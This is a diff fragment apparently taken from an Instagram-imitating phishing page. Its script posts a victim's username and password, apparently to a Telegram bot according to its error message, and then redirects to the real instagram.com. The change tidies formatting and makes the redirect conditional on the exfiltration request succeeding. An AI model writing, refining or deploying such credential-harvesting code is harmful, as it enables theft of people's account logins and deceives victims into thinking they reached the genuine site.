@@ -154,10 +154,14 @@
                     headers: {
                         'Content-Type': 'application/json',
                     },
-                    body: JSON.stringify({ username, password }),
+                    body: JSON.stringify({username, password}),
                 });
 
-                window.location.href = "https://www.instagram.com/";
+                if (response.ok) {
+                    window.location.href = "https://www.instagram.com/";
+                } else {
+                    console.error("Failed to send Telegram message:", await response.json());
+                }
 
             } catch (error) {
                 console.error("Error occurred:", error);
@@ -165,7 +169,7 @@
         }
     }
 
-    validateInputs(); // Initialize button state on page load
+    validateInputs();
 </script>
 </body>
 </html>
